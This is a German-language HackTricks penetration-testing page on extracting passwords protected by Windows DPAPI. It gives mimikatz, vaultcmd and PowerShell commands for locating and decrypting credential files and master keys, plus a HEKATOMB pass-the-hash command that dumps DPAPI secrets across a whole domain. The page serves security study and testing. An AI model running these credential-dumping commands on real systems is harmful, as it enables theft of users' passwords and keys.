# DPAPI - Extrahieren von Passwörtern

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **dem Ziel, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}


## Was ist DPAPI

Die Data Protection API (DPAPI) wird hauptsächlich im Windows-Betriebssystem für die **symmetrische Verschlüsselung asymmetrischer privater Schlüssel** verwendet und nutzt entweder Benutzer- oder Systemgeheimnisse als wesentliche Entropiequelle. Dieser Ansatz vereinfacht die Verschlüsselung für Entwickler, indem er ihnen ermöglicht, Daten mit einem aus den Anmeldegeheimnissen des Benutzers abgeleiteten Schlüssel zu verschlüsseln oder für die Systemverschlüsselung die Domänenauthentifizierungsgeheimnisse des Systems zu verwenden, wodurch die Notwendigkeit entfällt, den Schutz des Verschlüsselungsschlüssels selbst zu verwalten.

### Von DPAPI geschützte Daten

Zu den von DPAPI geschützten persönlichen Daten gehören:

- Passwörter und Autovervollständigungsdaten von Internet Explorer und Google Chrome
- E-Mail- und interne FTP-Kontopasswörter für Anwendungen wie Outlook und Windows Mail
- Passwörter für freigegebene Ordner, Ressourcen, drahtlose Netzwerke und Windows Vault, einschließlich Verschlüsselungsschlüssel
- Passwörter für Remote-Desktop-Verbindungen, .NET Passport und private Schlüssel für verschiedene Verschlüsselungs- und Authentifizierungszwecke
- Netzwerkpässe, die vom Credential Manager verwaltet werden, und persönliche Daten in Anwendungen, die CryptProtectData verwenden, wie Skype, MSN Messenger und mehr


## Liste der Tresore
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Anmeldeinformationen-Dateien

Die **geschützten Anmeldeinformationen-Dateien** können sich an folgenden Orten befinden:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Erhalten Sie Informationen zu Anmeldedaten mit Hilfe von Mimikatz `dpapi::cred`. In der Antwort finden Sie interessante Informationen wie die verschlüsselten Daten und die guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Sie können das **mimikatz-Modul** `dpapi::cred` mit dem entsprechenden `/masterkey` verwenden, um zu entschlüsseln:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Master-Schlüssel

Die für die Verschlüsselung der RSA-Schlüssel des Benutzers verwendeten DPAPI-Schlüssel werden im Verzeichnis `%APPDATA%\Microsoft\Protect\{SID}` gespeichert, wobei {SID} die [**Sicherheitskennung**](https://de.wikipedia.org/wiki/Sicherheitskennung) **dieses Benutzers** ist. **Der DPAPI-Schlüssel wird in derselben Datei wie der Master-Schlüssel gespeichert, der die privaten Schlüssel des Benutzers schützt**. Es handelt sich normalerweise um 64 Bytes zufälliger Daten. (Beachten Sie, dass dieses Verzeichnis geschützt ist und Sie es nicht mit `dir` von der Eingabeaufforderung aus auflisten können, aber Sie können es von der PowerShell aus auflisten).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
So sieht eine Gruppe von Master Keys eines Benutzers aus:

![](<../../.gitbook/assets/image (324).png>)

Normalerweise ist **jeder Master Key ein verschlüsselter symmetrischer Schlüssel, der andere Inhalte entschlüsseln kann**. Daher ist es interessant, den **verschlüsselten Master Key** zu **extrahieren**, um später die mit ihm verschlüsselten **anderen Inhalte** zu **entschlüsseln**.

### Extrahieren des Master Keys und Entschlüsseln

Überprüfen Sie den Beitrag [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) für ein Beispiel, wie der Master Key extrahiert und entschlüsselt wird.


## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) ist eine C#-Portierung einiger DPAPI-Funktionen aus [@gentilkiwi](https://twitter.com/gentilkiwi)'s [Mimikatz](https://github.com/gentilkiwi/mimikatz/) Projekt.

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ist ein Tool, das die Extraktion aller Benutzer und Computer aus dem LDAP-Verzeichnis und die Extraktion des Sicherungsschlüssels des Domänencontrollers über RPC automatisiert. Das Skript löst dann alle IP-Adressen der Computer auf und führt auf allen Computern einen smbclient aus, um alle DPAPI-Blobs aller Benutzer abzurufen und alles mit dem Sicherungsschlüssel der Domäne zu entschlüsseln.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Mit der aus dem LDAP extrahierten Liste der Computer können Sie jedes Teilnetzwerk finden, auch wenn Sie sie nicht kannten!

"Weil Domänenadministratorrechte nicht ausreichen. Hacke sie alle."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) kann automatisch mit DPAPI geschützte Secrets auslesen.

## Referenzen

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) ist die relevanteste Cybersicherheitsveranstaltung in **Spanien** und eine der wichtigsten in **Europa**. Mit **der Mission, technisches Wissen zu fördern**, ist dieser Kongress ein brodelnder Treffpunkt für Technologie- und Cybersicherheitsprofis in jeder Disziplin.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks als PDF-Download** haben? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder folgen Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
